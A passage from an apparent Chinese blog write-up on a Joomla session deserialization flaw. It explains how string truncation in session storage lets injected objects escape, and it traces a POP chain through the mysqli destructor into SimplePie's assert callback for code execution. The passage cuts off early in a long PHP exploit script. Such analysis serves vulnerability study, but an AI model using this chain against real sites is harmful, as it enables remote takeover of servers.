class="line"><span class="keyword">if</span> (!$db-&gt;execute())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Since $db-&gt;execute did not throw an exception, so the query was successful.</span></span><br><span class="line"><span class="comment">Either the data changed, or the data was identical.</span></span><br><span class="line"><span class="comment">In either case we are done.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读函数：<code>\libraries\joomla\session\storage\database.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Read the data for a particular session identifier from the SessionHandler backend.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>   string  $id  The session identifier.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  string  The session data.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>   11.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// Get the database connection object and verify its connected.</span></span><br><span class="line">$db = JFactory::getDbo();</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Get the session data from the database table.</span></span><br><span class="line">$query = $db-&gt;getQuery(<span class="keyword">true</span>)</span><br><span class="line">-&gt;select($db-&gt;quoteName(<span class="string">'data'</span>))</span><br><span class="line">-&gt;from($db-&gt;quoteName(<span class="string">'#__session'</span>))</span><br><span class="line">-&gt;where($db-&gt;quoteName(<span class="string">'session_id'</span>) . <span class="string">' = '</span> . $db-&gt;quote($id));</span><br><span class="line"></span><br><span class="line">$db-&gt;setQuery($query);</span><br><span class="line"></span><br><span class="line">$result = (string) $db-&gt;loadResult();</span><br><span class="line"></span><br><span class="line">$result = str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), $result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，在write函数中</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = str_replace(<span class="built_in">chr</span>(<span class="number">0</span>) . <span class="string">'*'</span> . <span class="built_in">chr</span>(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $data)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>会将<code>/x00*/x00</code> 替换为 <code>\0\0\0</code> ,因为protected修饰的变量在序列化后会带有<code>/x00*/x00</code> 而mysql中无法对<code>NULL</code>值进行存储，所以会对该处进行替换</p><p>为了保持数据完整性自然会在read函数中将<code>/x00*/x00</code>替换回来，就是下面这句</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result = str_replace(<span class="string">'\0\0\0'</span>, <span class="built_in">chr</span>(<span class="number">0</span>) . <span class="string">'*'</span> . <span class="built_in">chr</span>(<span class="number">0</span>), $result)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>到这里就会出现一个问题，如果写入的反序列化字符串存在<code>/0/0/0</code>，当read函数读取的时候，就会将其替换成<code>\x00*\x00</code>这样输入的字符串就少了三个字符，如下程序</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$result = <span class="string">'admin\0\0\0admin'</span>;</span><br><span class="line">$result = str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), $result);</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br></pre></td></tr></table></figure><p>该段输出为<code>adminN*Nadmin</code>，很轻易看出少了三个字符，这样在session反序列化时由于前面声明的字符串长度并未改变，所以会吃掉后面的三个字符，这样我们就可以通过这个利用点将两处反序列化中间的字段吃掉，使第二部分内容逃出来进行反序列化。</p><h1 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h1><p>起始触发点为 <code>/libraries/joomla/database/driver/mysqli.php</code>中的<code>__destruct()</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;disconnect();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>disconnect();</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">disconnect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Close the connection.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;connection) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;disconnectHandlers <span class="keyword">as</span> $h) &#123;</span><br><span class="line">            call_user_func_array($h, <span class="keyword">array</span>(&amp;<span class="keyword">$this</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        mysqli_close(<span class="keyword">$this</span>-&gt;connection);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;connection = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要满足<code>$this-&gt;connection</code>为<code>true</code> ，这里注意到 <code>call_user_func_array($h, array(&amp;$this));</code></p><p>其中第二个参数无法控制，所以我们无法在此处实现<code>assert</code>的回调执行，于是来寻找其他类是否有可以利用的的方法。</p><p>这里找到了<code>SimplePie</code>类的<code>init</code>方法，路径为<code>/libraries/simplepie/simplepie.php</code>，主要代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;feed_url !== <span class="keyword">null</span> || <span class="keyword">$this</span>-&gt;raw_data !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;data = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">$this</span>-&gt;multifeed_objects = <span class="keyword">array</span>();</span><br><span class="line">$cache = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;feed_url !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$parsed_feed_url = SimplePie_Misc::parse_url(<span class="keyword">$this</span>-&gt;feed_url);</span><br><span class="line"><span class="comment">// Decide whether to enable caching</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;cache &amp;&amp; $parsed_feed_url[<span class="string">'scheme'</span>] !== <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line">$cache = call_user_func(<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;cache_class, <span class="string">'create'</span>), <span class="keyword">$this</span>-&gt;cache_location, call_user_func(<span class="keyword">$this</span>-&gt;cache_name_function, <span class="keyword">$this</span>-&gt;feed_url), <span class="string">'spc'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们可以控制<code>call_user_func($this-&gt;cache_name_function, $this-&gt;feed_url)</code>的两个参数，这样就可以使用<code>assert</code>函数回调进行任意代码执行，同时这里需要满足上面的几个<code>if</code>条件</p><p>目前找到了执行任意命令的路径，最后一个问题就是joomla默认是没有载入<code>SimplePie</code>类的，所以这里使用了<code>JSimplepieFactory</code>类，该类在加载时会自动将<code>SimplePie</code>类导入当前环境，关键语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jimport(<span class="string">'simplepie.simplepie'</span>);</span><br></pre></td></tr></table></figure><p><code>if</code>处最难<code>bypass</code>的是<code>$parsed_feed_url[&#39;scheme&#39;] !== &#39;&#39;</code>，这里考虑用分割符形如 <code>code||$m=&#39;http://yemoli.top&#39;</code></p><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ERROR); </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>,<span class="string">"Off"</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimplePie_IRI</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Scheme</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> private</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> $scheme;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * User Information</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> private</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> $userinfo;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Host</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> private</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> $host;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Port</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> private</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> $port;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Path</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> private</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> $path;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Query</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> private</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> $query;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Fragment</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span 